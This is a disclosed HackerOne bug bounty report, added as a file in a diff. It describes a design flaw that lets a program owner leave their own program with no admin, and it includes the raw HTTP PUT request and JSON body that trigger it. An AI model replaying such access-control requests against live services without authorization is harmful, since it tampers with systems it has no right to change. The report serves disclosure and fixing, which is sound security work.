@@ -1,0 +1,36 @@
+ReportLink:https://hackerone.com/reports/141629
+WeaknessName:Violation of Secure Design Principles
+Reporter:https://hackerone.com/pardeepbattu02
+ReportedTo:HackerOne(security)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:06.07.2016 12:49:10
+
+Summary:
+
+Hey Jobert,
+
+
+There is a functional bug in hackerone, using which i am able to make the my program admin free.
+This shouldn't be happen in the program because atleast one admin be there in program.
+
+Request:
+PUT /sasas/groups/12307 HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Referer: https://hackerone.com/sasas/groups/12307/members/edit
+Content-Length: 157
+Cookie: 
+Connection: close
+
+{"id":12307,"name":"Admin","team_members_count":2,"permissions":["user_management","program_management"],"immutable":true,"team_member_ids":[{"id":"17940"}]}
+
+
+Thanks & Regards,
+Pardeep Battu
